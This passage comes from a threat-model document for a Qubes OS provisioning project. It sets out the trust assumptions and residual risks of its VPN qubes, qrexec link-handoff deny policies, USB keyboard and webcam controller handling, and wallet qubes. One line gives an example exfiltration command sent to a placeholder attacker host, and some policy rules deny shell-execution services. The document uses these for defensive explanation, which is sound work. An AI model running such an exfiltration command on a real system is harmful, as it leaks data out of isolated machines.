  upstream `download.vpn.gnosis.eth.limo/linux/install.sh` is mutable; SEQS
  deliberately does not pipe it to root and instead pins the package its
  stable channel listed when reviewed. A later upstream stable release requires
  a reviewed SEQS update rather than being installed automatically. The
  `download.vpn.gnosis.eth.limo` mirror keeps only the latest release, so
  SEQS downloads from `download.gnosisvpn.io`, which still served superseded
  releases on 2026-10-25; once upstream stops serving the pinned release, the
  build fails closed with HTTP 404 until the pin is updated. Only dom0's
  UpdateVM is checked for Whonix: if the
  `qubes.UpdatesProxy` policy routes template updates over Tor while dom0's
  UpdateVM is not a Whonix gateway, the `.deb` download still leaves without
  Tor. The
  package runs maintainer scripts as root and configures upstream's APT
  repository (mirrors `download.vpn.gnosis.eth.limo` and
  `download.gnosisvpn.io`). SEQS pins both mirrors so that only the
  `gnosisvpn` package can come from them, requires the installed repository
  keyring to hold exactly the pinned key, and locks it with `chattr +i`, as
  for the other third-party repositories. Every `gnosisvpn` upgrade rewrites
  that keyring (its postinst runs `install` over it), which the lock turns
  into a dpkg failure that blocks every later update of the template, so SEQS
  holds the package, as it does `brave-keyring`: GnosisVPN changes only when a
  reviewed SEQS pin installs a new release. When GnosisVPN publishes no usable IPv4 resolver, runtime DNS falls
  back to Cloudflare `1.1.1.1` and Google `8.8.8.8`; those providers can
  observe queries, although the helper verifies that they route through the
  tunnel and installs an output leak guard. The VPN qube retains upstream
  access so the VPN can establish its tunnel, while downstream forwarding
  fails closed. A compromised VPN qube can alter its own routing and firewall
  state.

### Proton VPN NetVM
- **Trust assumption:** the Proton VPN app and NetworkManager, which Qubes runs in `A-protonvpn` through its `network-manager` service, route client traffic into the tunnel.
- **Established by:** ✅ On hardware (2026-10-15), NetworkManager managed the qube's uplink (`VM uplink eth0`), kept the Qubes resolver addresses in `/etc/resolv.conf`, and the qube resolved names and reached the internet; the fail-closed forwarding hook above blocks clients while no tunnel is up.
- **Residual risk:** Not tested: a connection, because that needs a Proton account. Client DNS while connected relies on Qubes' NetworkManager hook (`qubes-nmhook`) pointing the Qubes resolver addresses at the DNS servers the connection sets. The app's own kill switch is not relied on, and its interplay with Qubes networking is untested.

### GnosisVPN automatic connection
- **Component:** `seqs-gnosisvpn-autoconnect.service` in the GnosisVPN template runs `/usr/sbin/seqs-gnosisvpn-autoconnect` at every start of the app qube: `gnosis_vpn-ctl start-client 1h`, then `gnosis_vpn-ctl connect <exit>`, with the exit from the first line of the root-owned `/rw/config/seqs-gnosisvpn-exit` (`Netherlands` unless changed).
- **Established by:** ✅ The script refuses an exit that `gnosis_vpn-ctl destinations` does not list, before it starts the worker, and passes the name as one argument. Unit tests cover the order of the two commands and the refusal; the hardware check confirms at every start that the worker started and accepted the connect (with an unfunded test account, the worker then waits for funds).
- **Residual risk:** The VPN connects, and spends account funds, whenever the qube starts, including when a client qube such as `D-anon` starts it. The client qubes stay fail-closed while it is not connected.

### Qubes routed through a VPN (`netvm` catalogue key) ✅
- **Component:** an entry with `'netvm': '<provider>'` (the shipped `anon`) gets `A-<provider>` as the explicit NetVM of its app qube and its named disposable; dom0 refuses a `netvm` that is not a `network_provider` entry, or whose qube is neither selected nor built for that recipe.
- **Established by:** ✅ After the dom0 apply, the runner refuses to provision unless each such qube has exactly that NetVM, set explicitly (not inherited from the global default); render and unit tests and mutations cover the checks, and the hardware check confirms the setting. The provider's fail-closed forwarding hook keeps the qubes offline while the VPN is down. `anon` sets `no_handoff`, so `D-anon` can hand no link to a qube outside the VPN, nor start a disposable; copying a file out (`qubes.Filecopy`) still needs the user to confirm the Qubes prompt.
- **Residual risk:** What is changed in the disposable template `A-anon`, such as a Brave profile, appears in every later `D-anon`. Brave itself can still be fingerprinted, and accounts used in it link sessions; the VPN hides only the network address.

### Bluetooth audio qube (`audio_provider` catalogue key) ⚠️
- **Component:** `A-bluetooth` holds the Bluetooth USB adapter, which the user assigns to it from `sys-usb`, and runs BlueZ, PipeWire, Blueman, and the Qubes audio daemon. For each qube whose `audiovm` names it, the daemon plays that qube's sound and, while the user attaches the microphone to that qube, sends it the headset's microphone. The `seqs.dom0` state enables its `audiovm` service and the `blueman` service, which starts Blueman's panel icon, sets its own `audiovm` to none, and writes `50-seqs-audiovm.policy` headed `Managed by SEQS`: the Admin API rules Qubes' own `sys-audio` gets. They allow `admin.Events`, `admin.vm.CurrentState`, and `admin.vm.List` on itself, dom0, and the qubes tagged `audiovm-A-bluetooth`, which Qubes tags every qube whose `audiovm` names it with; and reading those qubes' `audiovm`, `xid`, `stubdom_xid`, `virt_mode`, and `is_preload` properties and `audio` and `audio-model` features. A script that the template runs before `bluetoothd` starts (`/usr/sbin/seqs-bluetooth-bredr`) changes only the `PreferredBearer` line of paired devices.
- **Established by:** ✅ The pre-flight refuses `audio_provider` without `offline` or with `dispvm_template`, so the qube has no NetVM and, tagged `seqs-no-handoff`, no route into a networked disposable. On hardware (2026-10-16), `qvm-ls` in the audio qube listed only itself, dom0, and the one qube using it, and reading that qube's `netvm` failed. Render tests and mutations cover the pre-flight and the policy.
- **Residual risk:** `A-bluetooth` hears everything the qubes using it play and, while the microphone is attached, record, and can change it. Its Bluetooth stack is reachable over the air by nearby devices, so a remote BlueZ or firmware bug would give an attacker that position. The radio is also a way out that no NetVM setting closes: a compromised `A-bluetooth` can send what it hears to a nearby device, or through a paired phone's tethering. Offline qubes should therefore not use it; SEQS cannot refuse that, because a qube's `audiovm` is set at runtime. It learns when the qubes using it start and stop. In exchange, those qubes speak the Qubes audio protocol to its daemon instead of dom0's, so an attack on that daemon from a hostile client qube lands in `A-bluetooth`. When the qube is deleted, its rules stay in the policy file until the next build; they apply only to qubes whose `audiovm` names a qube of that name.

### Browser-link policy (`qubes.OpenURL` → `A-brave`)
- **Component:** the `seqs.dom0` state (`salt/seqs/dom0.sls`) writes root-owned policy files headed `Managed by SEQS`:
  - `29-browser.policy`: `qubes.OpenURL` from `@tag:seqs-handoff` to `A-brave`, `allow`. Other qubes keep the Qubes default, which asks.
  - `28-browser-suppress.policy`: from `@tag:seqs-no-handoff`, denies `qubes.OpenURL`, `qubes.OpenInVM`, `qubes.StartApp`, `qubes.GetImageRGBA`, `qubes.VMShell`, `qubes.VMExec`, `qubes.VMExecGUI`, and `qubes.PdfConvert` to `@anyvm`, a target that also matches `@dispvm` and a disposable requested by its template (`@dispvm:<template>`). It is evaluated before the 29- file (qrexec first-match-wins), so a qube carrying both tags, as during a tag swap, is denied.
  - Tags: every SEQS-built app qube and named disposable, selected in the run or not, is tagged `seqs-no-handoff` if its catalogue entry carries `offline`, `no_handoff`, or `firewall`, and `seqs-handoff` otherwise; the QR webcam qubes are always tagged `seqs-no-handoff`. The 28- file is written only after every `seqs-no-handoff` tag is in place. A clone of a SEQS qube copies its tag, and a disposable inherits its template's tags when it is created (verified on Qubes 4.3), so a disposable started by hand from a tagged disposable template such as `A-qr-display` is denied as well. A deny by name would not do this: on Qubes 4.3 a `@dispvm:A-<name>` source matches no running qube.
  - QR webcam mode: `00-seqs-qr-input-deny.policy` denies by name the same eight services from `sys-usb-webcam` and `seqs-qr-scanner`, which are created outside the catalogue, their `qubes.InputKeyboard`, `qubes.InputMouse`, and `qubes.InputTablet` to dom0, and `qubes.Filecopy` from `sys-usb-webcam`. `seqs-qr-scanner` exists in both webcam modes so that the scan never runs in an unnamed disposable. In sequential mode, `01-seqs-qr-filecopy.policy` lets `seqs-qr-scanner` copy files to the staging qube only.
  - A pre-existing policy file *without* the header is never silently overwritten: the runner's `confirmPolicyTakeover` blocks on a default-no `[y/N]` before any state runs.
  - The link-handoff handler (`/usr/share/applications/open-links-in-browser-qube.desktop`) is installed in every template, but is made the default browser (`xdg-settings set default-web-browser`) only in qubes without `offline`, `no_handoff`, or a `firewall` key; for those, the dom0 deny blocks the handoff regardless.
- **Trust assumption:** `A-brave` can safely handle arbitrary, possibly hostile URLs handed to it by any qube that *is* allowed to drive the handoff.
- **Established by:** A deliberate design choice — concentrating link handling in one browser qube *is* the isolation benefit.
- **Residual risk:**
  - For SEQS qubes WITHOUT `offline` / `no_handoff`, `A-brave` is a funnel for hostile links from all of them; its compromise is in scope. The policy verb is `allow`, **not `ask`**: any code running in those qubes can silently make `A-brave` open a chosen URL, to exfiltrate via DNS-in-URL, push the user at a phishing page, or chain a browser 0-day. `ask` would catch the unexpected programmatic case. Deferred — accepting the silent passthrough for ergonomic handoff.
  - For qubes WITH `offline` / `no_handoff` (default: `keepass`, `bluetooth`, the `qr-*` entries, `wallet-ledger`, `wallet-trezor`, `wireguard`, `gnosisvpn`, `protonvpn`, `anon`), the channel is closed at the dom0 qrexec boundary, which a compromise of the qube cannot change (the dom0 file is root-owned and the 28- file precedes the 29- file), and in the qube's xdg config. `offline` implies `no_handoff` because qrexec is unaffected by `netvm=none`: an offline qube could otherwise exfiltrate with `xdg-open https://attacker/?DATA`.
  - New disposables are a similar route. The Qubes 4.2 and 4.3 default policy lets any qube start one from its `default_dispvm`, normally the networked `default-dvm`, without a prompt through seven services (`qubes.OpenInVM`, `qubes.OpenURL`, `qubes.StartApp`, `qubes.GetImageRGBA`, `qubes.VMShell`, `qubes.VMExec`, `qubes.VMExecGUI`), and the PDF converter package of a default dom0 adds `qubes.PdfConvert`; a disposable requested by its template (`@dispvm:<template>`) gets a dom0 prompt. The 28- denies close both (verified on Qubes 4.3: without them, a `no_handoff` wallet qube could run a command in a networked disposable through `qubes.VMShell` without a prompt).
  - For `offline` qubes the primary control is `default_dispvm none`, set on `offline` app qubes, their named disposables, and the QR camera backends, so every `@dispvm` request from them fails; the runner re-checks it for `offline` app qubes and named disposables, and the sequential QR script for the camera-side qubes. Unnamed disposables such as `@dispvm:A-qr-camera` copy the template's explicit `none`; a disposable whose template never set `default_dispvm` would fall back to its own disposable template, which is offline here. The qrexec denies are a second layer. `qvm-prefs ... none` sets an explicit None, not an inherited default; the runner requires exactly that, and the hardware check confirms it on Qubes 4.3. An app qube with `no_handoff` or `firewall` (and not `offline`), and its named disposable, also gets `default_dispvm none` when a run builds it, so a lost tag does not reopen the networked default disposable; the runner re-checks this the same way.
  - The tag can be removed by any qube that the Admin API grants `admin.vm.tag.Remove`; SEQS and the default Qubes policy grant it to none.
  - qrexec applies the first matching rule, so a policy file that sorts before `28-browser-suppress.policy` (such as `00-` to `27-`) and allows one of these services wins over the deny.
  - Other default `ask` services, such as `qubes.Filecopy`, still prompt in dom0 and depend on the operator refusing unexpected dialogs.

### USB-keyboard policy override (`qubes.InputKeyboard` from `sys-usb` → dom0) ⚠️
- **Component:** the `seqs.dom0` state writes `/etc/qubes/policy.d/30-user-input.policy` on Qubes 4.3 when `sys-usb` exists, the pillar setting `usb_keyboard_prompt` is `True` (the default), and Qubes' own `50-config-input.policy` neither allows nor asks for `qubes.InputKeyboard` from `sys-usb` to dom0. Where that file does, or the setting is `False`, the state instead removes a 30- file that carries the SEQS marker and leaves any other alone; on other releases the state neither writes nor deletes the file; the runner's takeover prompt is scoped the same way. The file contains:
  `qubes.InputKeyboard  *  sys-usb  @adminvm  ask default_target=@adminvm`
- **Trust assumption:** When a USB device claiming to be a keyboard is attached, the operator will reliably distinguish their own keyboard from a hostile one (BadUSB / O.MG cable / mass-storage stick with HID firmware) and decline the attach prompt for the hostile case.
- **Established by:** A deliberate ergonomic tradeoff. On a computer installed with a built-in keyboard, the shipped Qubes 4.3 `50-config-input.policy` *denies* `qubes.InputKeyboard` from `sys-usb` to dom0 outright, so external USB keyboards do not work at all out of the box. The 30- override lowers that to `ask`, matching the mouse/tablet behaviour, so an external keyboard is usable after one confirmation. `default_target=@adminvm` (dom0 pre-selected in the dialog) means a single Enter accepts the attach. On a computer installed with a USB keyboard, the installer writes `allow` into `50-config-input.policy` instead, and SEQS leaves that alone: Qubes answers `ask` only inside a logged-in session, so an `ask` override there locks the login screen at the next boot (seen on a NUC, 2026-10-20).
- **Residual risk:** This is a clear weakening of dom0's input isolation versus the Qubes default. Any USB device that enumerates as a HID keyboard — including a BadUSB / Rubber-Ducky implant or a vendor device with hostile firmware — triggers the same prompt as a legitimate keyboard, and the prompt is biased toward acceptance (default = dom0, single keystroke confirms). A successful accept yields keystroke injection into dom0 = total compromise. Dom0 cannot tell a device's input from input that `sys-usb` fabricates, so a compromised `sys-usb` can raise the prompt itself, and accepting a keyboard or mouse prompt even for the operator's own device gives it the channel. Mitigations the operator must apply themselves: never attach unknown USB devices, prefer a PS/2 keyboard or a keyboard permanently on the dom0-attached internal controller, read the qube selector in the prompt rather than reflexively pressing Enter, and deny any prompt they did not cause by plugging a device in. On a computer installed with its built-in keyboard, `usb_keyboard_prompt = False` keeps the Qubes `deny`; the QR guides recommend it for the receiving computer of a high-value sequential transfer. Deferred — accepting the BadUSB uplift in exchange for being able to use external USB keyboards on Qubes 4.3 without per-boot manual `qvm-input-keyboard` ceremony.

### QR webcam PCI-controller assignment ⚠️
- **Component:** When QR webcam mode is enabled, `seqs.dom0` manages the selected physical USB controller through Qubes' PCI-device interface (`qvm-pci`, an alias for `qvm-device pci`):
  - It gives `sys-usb-webcam` a persistent attachment of the controller, with strict reset unless `webcam_usb_no_strict_reset` is set, after removing any earlier `sys-usb-webcam` assignment, because Qubes refuses a duplicate.
  - Dedicated mode first removes the controller from every other qube (`detach` plus `unassign`), restarting the qubes it stopped, normally `sys-usb`, without it. The scan of other qubes skips dom0, whose `qvm-pci list` shows every device it exposes. Dedicated mode refuses `no-strict-reset`, because its transfers are not separated by a power-off.
  - Sequential mode first requires the controller to be attached to the configured normal USB backend. On 4.3, `qvm-pci list <qube>` shows PCI devices only while that qube runs, so this check needs a running `sys-usb`. Sequential mode accepts `no-strict-reset`, because the ceremony always ends in a power-off before `sys-usb` takes the controller back; the rule to set it only for a controller without a PCI reset method is documented, not enforced.
  - Release differences, from the Qubes source: `qvm-pci` has no `detach --persistent`; 4.3 removes an assignment with `unassign`, 4.2 with `detach` of a halted qube, so the state runs both; an assignment made on 4.2 and carried into 4.3 records no device identity and is removed only by `unassign --port`, which the state also runs. The guide's hardware lookups use 4.3-only options and require Qubes 4.3 on the receiving computer. No `qvm-prefs pcidevs` property is used; it is not part of the supported Qubes preferences interface.
  - Before each sequential scan, the dom0 script refuses to start if `sys-usb-webcam`, the scanner, or the staging qube has a NetVM or a default disposable, and it lists the devices in `sys-usb` (with control characters stripped) so that the operator can spot an internal device that was switched back on. A `sys-usb-webcam` that is already running counts as exposure: the script refuses and powers off. Dom0 bounds the scan to 4 minutes, so a hung scanner cannot hold off the power-off, and a refused orderly power-off is forced.
- **Trust assumption:**
  - The operator maps the physical ports to the correct controller, Qubes reports and enforces PCI assignments correctly, the IOMMU isolates the device, and the selected controller reset behaves as required.
  - The confidentiality argument is 2-of-2: the camera side (webcam, camera-side qubes) and the keyboard side (normal `sys-usb`, the USB keyboard and its controller, any camera attached to `sys-usb`) are both untrusted, and the secret is protected only while at most one of them is hostile; a passphrase typed through a keyboard path that bypasses every USB qube reduces the keyboard side to dom0. Wherever dom0 accepts keyboard or mouse input from `sys-usb` (by the installer's `allow` on a computer installed with a USB keyboard, whichever keyboard is typed on, or through an accepted prompt on one installed with its built-in keyboard), the argument covers only a keyboard side that observes: a compromised `sys-usb` or malicious USB keyboard can inject keystrokes or clicks into dom0 or either key qube and take the secret without the camera side, so `sys-usb` is then a single point of failure, as it already is for the whole Qubes system. Only a built-in-keyboard computer on which no USB keyboard or mouse is used and every such prompt is denied keeps the keyboard side to an observer; `usb_keyboard_prompt = False` removes the keyboard prompt altogether, while Qubes' own mouse prompt remains.
  - Dedicated mode additionally assumes the selected socket's USB 2 and USB 3 connections both lead to the selected controller; on a split socket a hostile webcam can also connect over the other connection into `sys-usb`, which the post-build `qvm-usb` check cannot reveal. Sequential mode additionally assumes complete power removal clears all camera-influenced transient state before trusted USB input resumes.
- **Residual risk:**
  - Selecting the wrong controller can remove trusted input or expose a required device.
  - A device or controller with persistent malicious firmware survives disposable teardown, and sequential reuse is weaker than permanent hardware separation even with strict reset and cold power-off.
  - With `no-strict-reset`, controller state left by `sys-usb`, possibly traces of earlier keyboard input, reaches the camera side; that side has no NetVM and no default disposable (see "Browser-link policy" above) and could pass such traces on only through the scanned file, which stays in offline qubes, or to the webcam itself.
  - In sequential mode, camera-influenced state that survives power-off reaches `sys-usb`, which can type or click in dom0 wherever dom0 accepts keyboard or mouse input from it, so the worst case is compromise of the whole receiving computer, not only the passphrase.
  - Internal USB devices on a sequential controller that cannot be switched off in firmware make the ceremony refuse only after they have shared `sys-usb-webcam` with the webcam; the documented pre-build `qvm-usb` check and the operator's reading of the device list the script shows before START are the only guards. In dedicated mode, an internal radio such as Bluetooth left switched on on the controller gives the camera side a way to send data out without a network; the guide requires switching such radios off in firmware, which SEQS cannot check.
  - The split-socket test and the controller lookups rely on what `sys-usb` reports, which a compromised `sys-usb` could falsify. In sequential mode a wrong lookup cannot expose the keyboard side as long as no internal device on the configured controller stays switched on, because the script then finds no device during the scan and powers off without scanning, as it does when the webcam is plugged into another controller's socket.
  - The 16 KiB limit on the scanned `key.asc` is checked only inside the untrusted scanner; dom0 policy limits where it can copy files to `A-qr-staging`.
  - The hardware qualification and ceremony in `docs/secure-qr-transfer.md` are mandatory; enable `no-strict-reset` only for a sequential-mode controller that has no PCI reset method.

### QR ciphertext fingerprint comparison ✅
- **Component:** Before the trusted target passes scanned `key.asc` to GnuPG, the trusted source and target key qubes independently calculate and display the first 80 bits of SHA-256 as four groups of five uppercase hexadecimal characters. The operator compares all groups visually. The fingerprint is neither written on paper nor transported through the untrusted QR channel; the source retains its exact ciphertext until comparison completes. Only the one-time encryption passphrase travels on paper.
- **Trust assumption:** The source and target displays are trusted, the operator compares every character, SHA-256 retains fixed-target preimage resistance, and GnuPG rejects an incorrect passphrase or failed encrypted-data integrity check. An 80-bit displayed prefix intentionally trades security margin for a reliable human comparison; a targeted substitute has an expected 2^80 work factor. The guide's scan commands assume that `zbarcam --raw` adds no line break to the scanned data, which holds for zbar 0.23.92 and 0.23.93 (Debian 12 and 13); if it did, every fingerprint would differ and the guide tells the operator to stop.
- **Residual risk:** Human comparison can still miss a differing character, especially with poor fonts or partial spot-checking. The procedure requires uppercase grouped output, a large monospace display, and comparison of all four groups. A fingerprint copied or embedded in the same QR channel would not authenticate that channel. After a match, GnuPG still parses attacker-influenced bytes if the operator compared incorrectly, and the overall procedure continues to trust both key qubes and GnuPG.

### CPU pinning and vCPU count (`cpu_pinning` and `vcpus` catalogue keys) ✅
- **Component:** for a catalogue entry with `cpu_pinning`, the `seqs.dom0` state writes `/etc/qubes/templates/libvirt/xen/by-name/A-<name>.xml` (root, 0644), a template that Qubes renders in dom0 at every start of that qube, and sets the qube's `vcpus`. An entry with `vcpus` instead gets only that vCPU count. The file carries a `Managed by SEQS` first line; SEQS deletes it when the key is removed and never overwrites or deletes such a file without that line.
- **Established by:** ✅ The pre-flight accepts only integer cores that `xl info` reports for this machine, no core twice, and an integer weight from 1 to 65535, before any value reaches the file, and a `vcpus` value only as a positive integer, before it reaches the `qvm-prefs` state, so a catalogue value cannot inject template or XML syntax into a file that dom0 renders.
- **Residual risk:** The pinning changes only scheduling: a pinned qube competes less for, or gets more of, the listed cores. A file written by hand for the same qube name is outside SEQS and makes the pre-flight refuse the key.

### Panel launchers (`main_app` catalogue key) and the GnosisVPN traffic monitor ✅
- **Component:** after provisioning, `setup-qubes.sh` adds one launcher per built app qube and named disposable to the dom0 user's XFCE panel (`xfconf-query -c xfce4-panel`, `~/.config/xfce4/panel/launcher-<n>/`), marked with the qube's name; `delete-vms.sh` removes the launcher of a qube it removes. Its items are copies of the dom0 menu entries that `qvm-appmenus` generated for that qube: the `main_app`, `xfce4-terminal.desktop`, and `thunar.desktop`.
- **Established by:** ✅ The pre-flight accepts a `main_app` only as a desktop file name (`[A-Za-z0-9][A-Za-z0-9._-]*.desktop`), and the runner checks the same form in the `seqs-launcher-items` feature before using it. A launcher item runs exactly what the qube's Qubes menu entry runs (`qvm-run --service -- <qube> qubes.StartApp+<app>`); the qube-supplied name and icon in it are the ones `qvm-appmenus` already sanitized for the menu.
- **Component (monitor):** for a GnosisVPN qube, the runner adds a generic monitor to the panel, which runs `/usr/local/bin/seqs-vpn-monitor <qube>` (root, 0755, installed by the `seqs.dom0` state from `salt/seqs/files/seqs-vpn-monitor`) every two seconds. That script runs `seqs-gnosisvpn-rates` in the qube as its normal user (reading interface counters needs no root) with `qvm-run --no-autostart`, under a two-second timeout, reading at most 100 bytes.
- **Established by (monitor):** ✅ The panel interprets markup in the monitor's text, including click actions that run dom0 commands, so the dom0 script prints only what it formats from four numbers of at most 19 digits and shows `VPN: n/a` for any other output. It refuses a qube name that could be read as an option.
- **Component (dom0 launchers and shortcuts):** the `seqs.dom0` state writes the `dom0_launchers` and `window_tiling_keys` settings to `/var/lib/seqs/desktop` (root, 0644) after checking each launcher as a desktop file name and each shortcut as `<Modifier>...Key` mapped to an xfwm4 action ending in `_key`. The runner re-checks every line with the same patterns, adds one launcher per listed program whose item is dom0's own `/usr/share/applications/<name>` (marked `seqs-dom0`; nothing is copied), and binds the shortcuts in `xfconf-query -c xfce4-keyboard-shortcuts` under `/xfwm4/custom/`, copying the default theme there first. No qube-supplied value reaches either.
- **Residual risk:** a launcher adds no trust beyond the Qubes menu entry it copies. Its copies are refreshed only by a build that selects the qube, so a menu entry changed in between (for example, renamed by a template update) leaves the launcher item stale until then. Each build that adds or refreshes a plugin restarts the dom0 panel. The monitor is project code that dom0 runs every two seconds; a compromised VPN qube controls only the four numbers shown, and can delay each panel update by up to two seconds.

### Boot / shutdown cleanup service ✅
- **Component:** the `seqs.qube` state writes `/usr/sbin/seqs-cleanup` (root, 0755) and `/etc/systemd/system/seqs-cleanup.service` into every template except those of `preserve_incoming` entries (default: `qr-staging`); the systemd unit runs `seqs-cleanup` at app-qube boot **and** shutdown. The script is a no-op inside TemplateVMs and StandaloneVMs (`qubesdb-read /qubes-vm-persistence` guard, fail-closed: only `rw-only` (AppVMs, including network providers) and `none` (disposables) delete). It is installed to `/usr/sbin` (root volume, inherited by app qubes) rather than `/usr/local/bin`, because `/usr/local` in a TemplateBased AppVM/DispVM is a per-qube bind mount to `/rw/usrlocal` and does **not** inherit the template's copy — a script placed there would be invisible to every app qube and the unit would fail `203/EXEC`. Each `cleanup_dirs` entry (pillar `config.sls`) has a `mode`: `folder` paths are removed entirely (`rm -rf`), while `contents` paths have their contents wiped (`find -mindepth 1 -delete`) but the directory itself is kept. Defaults: `folder /home/user/QubesIncoming`, `contents /home/user/Downloads`.
- **Trust assumption:** Every `cleanup_dirs` entry is genuinely a transient location the operator wants wiped on every boot and shutdown.
- **Established by:** ✅ Validated twice — in the `seqs.dom0` pre-flight (nothing is built on failure) and again at render time inside each qube by `seqs.qube`: mode must be `folder` or `contents`, the path must be absolute, strictly under `/home/user/` with every segment non-empty and none of them `.` or `..`, and use only `[A-Za-z0-9._/-]` characters. Entries such as `/home/user`, `/home/user//`, `/etc`, `/`, or `/home/user/../etc` are rejected before any template is built, bounding deletion to the qube user's home tree. Spaces and shell metacharacters are rejected so interpolation cannot escape the cleanup loop.
- **Residual risk:** Within the validated bound, `seqs-cleanup` runs as root and *will* delete anything the operator put into a `cleanup_dirs` location between boot and shutdown — Downloads contents vanish on every reboot (the `Downloads` directory itself is kept; QubesIncoming is removed entirely), including transaction CSV exports, wallet-recovery sheets and downloaded firmware. This is by design (transient = transient), but the operator must internalise that those directories are not for storage. Note also that the shutdown leg (`ExecStop`) is best-effort: it does **not** run on `qvm-kill`, host power-loss, or a dom0 crash — the boot leg (`ExecStart`) is the reliable backstop that guarantees a clean state before the qube is used. The wipe is an `unlink`, not a secure erase; on thin-LVM/SSD-backed private volumes the underlying blocks are not guaranteed to be overwritten.

### dom0 terminal output sanitization ✅
- **Component:** `setup-qubes.sh` defines `sanitize()`, a three-stage filter (`tr -d '\000-\010\013-\037\177'` for C0 controls except TAB/LF plus DEL; `iconv -f UTF-8 -t UTF-8 -c` for raw 8-bit C1 bytes; a `sed` strip of UTF-8-encoded C1 codepoints U+0080–U+009F). Everything that reaches the dom0 terminal flows through it: all `qubesctl` output (`runQubesctl`), error messages that can embed attacker-influenced strings (tar entry names), the policy-takeover banner, and the diff that staging prints.
- **Trust assumption:** The dom0 terminal emulator should never have to interpret a control byte that originated inside a VM.
- **Established by:** ✅ Per-qube provisioning runs through the disposable management VM; VM output is not executed or parsed in dom0. The sanitizer protects display paths because `qubesctl --show-output` can include installer output from target qubes. ESC, BEL, CR, FF, SO/SI, CSI/OSC, and both C1 encodings cannot reach the terminal; UTF-8 remains readable.
- **Residual risk:** The failure-marker scan in `runQubesctl` greps this sanitized output for `Result: False`, non-zero `Failed:` counts, and `<qube>: ERROR` lines — a VM that could forge or suppress those markers could at most cause a spurious failure report, or the skipping of app qubes whose template appears failed (annoying, fail-safe direction), since the exit code is checked independently. The remaining unsanitized surface is what the `qvm-*` management commands print directly — deterministic Qubes management strings, not VM-controlled output.

### ADB file transfer ✅
- **Component:** `install-scripts/components/adb/template-vm.sh` -- `apt-get install -y adb pv` (Debian-signed). The chunked, resumable `adb-pull` helper (`install-scripts/components/adb/adb-pull.sh`) is staged next to the install script as a per-component asset by the `seqs.qube` state and installed system-wide to `/usr/bin/adb-pull` in the template.
- **Qube:** `A-usb-data-transfer` (red label). `sys-usb` is **not** modified; phones are USB-attached to this qube via Qubes' standard device-attach mechanism, isolating the larger ADB code surface from the front-line USB qube.
- **Trust assumption:** The Android device / ADB peer attached to the qube is the real one.
- **Established by:** ✅ `adb` and `pv` arrive through normal Debian apt signature verification.
- **Residual risk:** Wireless ADB (the fallback when USB attach isn't an option) exposes a shell-capable channel on the LAN; the `adb-pull` end-of-transfer SHA-256 check catches transport corruption but **not** a malicious peer (both hashes flow through the same ADB channel). Prefer USB-attached ADB; reserve wireless ADB for trusted networks.

### Hardware-wallet udev rules ⚠️
- **Components:** `install-scripts/components/ledger/template-vm.sh` and `install-scripts/components/trezor/template-vm.sh` install the Ledger and Trezor udev rules respectively.
- **Trust assumption:** Any USB device that enumerates with a Ledger or Trezor VID/PID is the actual hardware wallet the operator intended to attach.
- **Established by:** 📝 Reviewed; mirrors vendor-published rules. The rules also tighten the upstream `MODE="0666"` to `0660` + `uaccess`/`udev-acl`, so the device is only reachable via the seated user's dynamic ACL rather than by every process on the system — a real improvement over the vendor default.
- **Residual risk:** udev grants `uaccess` based on USB VID/PID alone, and USB descriptors are entirely self-asserted. Any programmable USB device — BadUSB, an O.MG cable, a flashed Pi Pico, a hostile dev board — can claim `0x2c97` / `0x2581` (Ledger) or `0x534c` / `0x1209` (Trezor) and receive the same ACL as the genuine wallet. Concrete consequences:
    - A device swapped during shipping, in an evil-maid scenario, or on a contaminated cable / port can present itself as the operator's wallet and talk to whatever software is running in `A-wallet-*` until the user catches it: attempt firmware downgrade, probe via crafted hidraw exchanges, or — if the wallet UI is already unlocked when the substitution happens — script-drive interactions with an open signing dialog.
    - The wallet *protocol* still authenticates the genuine device (passphrase, on-screen confirmation on the Ledger/Trezor itself), so a pure spoofer cannot forge a signed transaction. But it can talk to the host stack, and that surface is non-trivial.
    - There is no automated signal to the operator that "this isn't my real wallet" — the device tree shows the right name. Treat any unfamiliar physical device the same as an unfamiliar repo: confirm provenance before attaching, and prefer attaching the wallet only when actively using it rather than leaving it persistently bound to `A-wallet-*`.
- **Trezor-specific note — no vendor host software ⚠️:** The `trezor` component installs **only** the udev rules. Trezor Suite, Trezor Bridge and `trezorctl` are deliberately not installed; the default `wallet-trezor` qube spec (`trezor brave-extension-rabby`) leaves the in-browser Rabby extension (via WebUSB / WebHID) as the **sole** code path that can speak the Trezor protocol in that qube. Two operational consequences the operator must internalise:
    - **No out-of-browser cross-check.** A user who would normally open Trezor Suite "just to see the same transaction independently" has no second pane of glass here. A compromised Rabby update therefore has no in-qube tool to be cross-checked against — the on-device confirmation screen is the *only* place the operator can read the transaction details from a non-Rabby source. Treat that screen as load-bearing, not as a formality.
    - **Firmware updates and recovery flows live elsewhere.** Trezor firmware updates, recovery-seed checks, and any Suite-only diagnostic require either installing Suite into this qube (not done by SEQS — adds package surface) or attaching the device to a separate trusted machine for those operations. The qube as shipped is a *signing* qube, not a *management* qube.

  If you want a vendor-side host stack despite the surface tradeoff, install `trezor-suite` (AppImage from the vendor — verify against the [Trezor signing key](https://trezor.io/learn/a/check-trezor-suite-signatures)) in the template, or factor a separate `wallet-trezor-suite` qube. The Ledger entry above already pays this cost via the `ledger` component's template phase (`/usr/bin/LedgerLive.AppImage`); the Trezor entry deliberately does not, and the asymmetry is worth knowing.

### Wallet qube egress is unrestricted ⚠️
- **Component:** the default wallet qubes (currently `wallet-ledger` and `wallet-trezor`) inherit dom0's default `netvm` (`sys-firewall`) with no `qvm-firewall` allow-list — i.e. these qubes can reach **any** internet host. Same for any future wallet qube added to `qube_catalog`.
- **Trust assumption:** Every piece of code that ever runs in the wallet qube — Brave, the force-installed wallet extensions, Ledger Live, anything the operator later installs — is honest about *which* hosts it contacts.
- **Established by:** Nothing automated. Qubes' per-qube firewall is left at its default allow-all rule set; SEQS does not impose a destination allow-list because the right one (which RPC endpoints? which block explorers? which dApp domains?) is operator-specific.
- **Residual risk:** This is the silent half of the wallet-qube threat model. A wallet-extension supply-chain compromise (see "Brave wallet extensions ⚠️" in §3) — or a hostile Ledger Live release (see "Ledger Live" in §3) — lands in a qube whose only network rule is "anything outbound, anywhere." Concretely, a hostile Rabby / MetaMask / etc. update can:
    - exfiltrate state the extension has access to (open dApps, populated form fields, wallet addresses, browsing context) to a host of its choosing, without prompting;
    - silently substitute the RPC endpoint or block-explorer URL so the operator sees fabricated balance / quote / gas data while signing requests are routed via a hostile relay;
